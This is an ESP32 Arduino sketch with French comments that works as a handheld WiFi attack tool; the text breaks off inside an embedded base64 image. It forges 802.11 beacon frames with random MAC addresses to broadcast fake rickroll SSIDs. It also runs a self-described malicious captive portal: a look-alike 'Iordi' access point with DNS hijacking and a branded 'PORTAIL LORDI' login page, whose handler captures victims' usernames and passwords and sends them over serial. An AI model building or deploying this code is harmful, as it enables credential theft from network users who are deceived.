// Librairies nécessaires
#include <WiFi.h>
#include "esp_wifi.h"
#include <DNSServer.h>
#include <WebServer.h>



// Pour l'envoie des réseaux fictifs (spoofing):
const char ssids[] PROGMEM = { // Noms des réseaux (ssids) fictifs pour le rickroll
  "Never\n"
  "Gonna\n"
  "Give\n"
  "You\n"
  "Up\n"
};
char emptySSID[32];
uint8_t macAddr[6]; 
const uint8_t channels[] = {1, 6, 11}; // Canaux WiFi utilisés pour l’envoi de trames WiFi fictives (les plus efficaces popur le 2.4GHz sans interérences)
uint8_t tramPacket[109] = {
  0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04,
  0x05, 0x06, 0x00, 0x00, 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00,
  0x00, 0x00, 0xe8, 0x03, 0x31, 0x00, 0x00, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x01, 0x08,
  0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01,
  0x01, 0x30, 0x18, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x02,
  0x00, 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04, 0x01,
  0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00
};
unsigned long startTime = 0;
const unsigned long spoofDuration = 15000;  // temps de duré du rickroll (15000 mili secondes = 15 secondes)
bool spoofActive = false; // Indicateur de l'état du rickroll



// Pour le portail captif malveillant:
const byte DNS_PORT = 53; // Port nécessaire pour que le trafic passe par l'esp32
DNSServer dnsServer; // Serveur DNS pour redirection
WebServer webServer(80); // Serveur web pour la page de connexion
const char* portailSSID = "Iordi"; // Nom du réseau wifi du portail captif. "Iordi" et non "lordi" pour éviter qu'il s'appelle "lordi 1"
bool portalActive = false; // Indicateur de l'état du portail



void setup() {
  Serial.begin(9600);
  Serial2.begin(9600, SERIAL_8N1, 16, 17);  // Communication with Arduino UNO
  WiFi.mode(WIFI_MODE_STA); //Mode du wifi: station (client WiFi)
  randomSeed(esp_random()); // Pour générer l'aléatoir (pour l'addresse MAC notamment)

  // Initialisation du SSID vide (32 espaces)
  for (int i = 0; i < 32; i++) emptySSID[i] = ' ';
  esp_wifi_set_channel(channels[0], WIFI_SECOND_CHAN_NONE); // Sélection du premier canal
}

void loop() {
  // Lecture des commandes de l'arduino
  if (Serial2.available()) {
    char command = Serial2.read();
    switch (command) {
      case '1': // scan les wifi
        stopPortal();
        scanWifi();
        delay(2500);
        break;
        
      case '2': // Démarre le spoofing
        stopPortal();
        startSpoof();
        break;
        
      case '3': // Démarre le portail
        if (spoofActive) stopSpoof();
        setupPortal();
        break;
        
      case '4': // Arrête le portail
        stopPortal();
        break;
        
      default:
        break;
    }
  }
  
  if (spoofActive) { // Envoi des trames si le spoofing est actif
    if (millis() - startTime < spoofDuration) {
      sendTrams(); // Envoie les trames de SSID fictifs
      nextChannel(); // Change de canal
    } else {
      stopSpoof(); // Arrête le spoofing après le temps défini
    }
  }

  if (portalActive) {   
    dnsServer.processNextRequest(); // Traite les requêtes DNS
    webServer.handleClient(); // Gère les requêtes HTTP
  }
}



void scanWifi(){ // scan wifi
  WiFi.mode(WIFI_STA); // Mode du wifi: station (client WiFi) 
  WiFi.disconnect(); 
  delay(100);

  int n = WiFi.scanNetworks(); //On affiche que le nombre de réseaux mais beaucoup d'autres informations sont obtenables facilement

  if (n == 0) {
    Serial2.println("no networks found");
  } else {
    Serial2.print(n);
    Serial2.println(" networks found");
  }
  WiFi.scanDelete();
}



// Change de cannal wifi pour la prochaine traam du spoofing
void nextChannel() {
  static uint8_t channelIndex = 0; // Index du canal actuel
  esp_wifi_set_channel(channels[channelIndex++ % 2], WIFI_SECOND_CHAN_NONE);
}


// Génère une adresse MAC aléatoire pour chaque trame
void randomMac() {
  for (int i = 0; i < 6; i++) macAddr[i] = random(256);
}


// Démarre le spoofing wiFi
void startSpoof() {
  startTime = millis();
  spoofActive = true;
}


// Arête le spoofing wifi
void stopSpoof() {
  spoofActive = false;
}


// Envoie des trames WiFi avec des SSID fictifs
void sendTrams() {
  int ssidIndex = 0;
  int ssidLen = strlen_P(ssids);

  // Parcours de chaque SSID dans la liste
  while (ssidIndex < ssidLen) {
    char tmpSSID[32];
    int i = 0;
    char tmp;

    // Lecture du SSID jusqu'à '\n' (ou 32 caractères dans le cas ou on veut des ssids plus longs)
    do {
      tmp = pgm_read_byte(ssids + ssidIndex + i);
      tmpSSID[i++] = tmp;
    } while (tmp != '\n' && i < 32);

    // Génération et copie de l'adresse MAC dans la trame
    randomMac();
    memcpy(&tramPacket[10], macAddr, 6);
    memcpy(&tramPacket[16], macAddr, 6);
    memcpy(&tramPacket[38], emptySSID, 32); // Commence avec le ssid vide
    memcpy(&tramPacket[38], tmpSSID, i - 1); // puis copie le ssid actuel

    // Envoi de la trame plusieurs fois pour chaque SSID
    for (int j = 0; j < 3; j++) {
      esp_wifi_80211_tx(WIFI_IF_STA, tramPacket, sizeof(tramPacket), false);
      delay(1);
    }

    ssidIndex += i; // ssid suivant
  }
}






void stopPortal() { // stop le portail captif
  if (portalActive) {
    webServer.stop();
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    portalActive = false;
  }
}

void handleLogin() { // s'affiche quand quelqu'un se "connecte" au portail capif
  String username = webServer.arg("username");
  String password = webServer.arg("password");
  
  Serial2.print("Username: ");
  Serial2.println(username);
  Serial2.print("Password: ");
  Serial2.println(password);
  
  String html = R"(
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset='UTF-8'>
      <meta name='viewport' content='width=device-width, initial-scale=1.0'>
      <style>
        body { font-family: Arial; margin: 0; padding: 20px; background: #f0f0f0; }
        .container { max-width: 400px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); text-align: center; }
        .warning { background: #ff4444; color: white; padding: 10px; text-align: center; border-radius: 5px; margin-bottom: 20px; }
      </style>
    </head>
    <body>
      <div class='container'>
        <div class='warning'>Réseau Lordi:</div>
        <h2>Connexion établie au réseau Lordi.</h2>
        <p>Vous pouvez désormais fermer cette page.</p>
      </div>
    </body>
    </html>
  )";
  webServer.send(200, "text/html", html);
}

void setupPortal() { // Portail de connexion (la page n'est pas très belle sur téléphone ':) )
  WiFi.mode(WIFI_AP);
  WiFi.softAP(portailSSID);
  
  IPAddress myIP = WiFi.softAPIP();
  dnsServer.start(DNS_PORT, "*", myIP);

  webServer.on("/login", HTTP_POST, handleLogin); // Affiche la confirmation de connexion

  webServer.onNotFound([]() {
    String html = R"(
<!DOCTYPE html>
<html>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: #f8f9fb;
            min-height: 100vh;
        }
        .header {
            background: #000;
            padding: 10px 20px;
            display: flex;
            align-items: center;
        }
        .header img {
            height: 24px;
        }
        .header span {
            color: white;
            margin-left: 10px;
            font-size: 14px;
        }
        .main-content {
            display: flex;
            justify-content: center;
            padding: 60px 20px;
            gap: 100px;
        }
        .left-side {
            display: flex;
            align-items: flex-start;
            gap: 20px;
        }
        .icon {
            width: 70px;
            height: 70px;
            fill: #666;
        }
        .text-content {
            max-width: 300px;
        }
        .text-content p {
            margin: 5px 0;
            font-size: 14px;
            color: #333;
        }
        .right-side {
            background: white;
            padding: 30px;
            border-radius: 4px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
            width: 300px;
        }
        input {
            width: 100%;
            padding: 8px;
            margin: 8px 0 20px;
            border: 1px solid #ddd;
            border-radius: 2px;
            box-sizing: border-box;
            font-size: 13px;
        }
        input[type="password"] {
            font-family: helvetica, sans-serif;
            letter-spacing: 1px;
        }
        .login-button {
            width: 100%;
            padding: 8px;
            background: #c91800;
            color: white;
            border: none;
            border-radius: 2px;
            cursor: pointer;
            font-size: 14px;
        }
        .login-button:hover {
            background: #9e1300;
        }
    </style>
</head>
<body>
    <div class="header">
        <svg width='120' height='24' viewBox='0 0 120 24'>
            <img src='data:image/png;base64,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'/>
        <span>PORTAIL LORDI</span>
    </div>
    <div class="main-content">
        <div class="left-side">
            // <img src='data:image/png;base64,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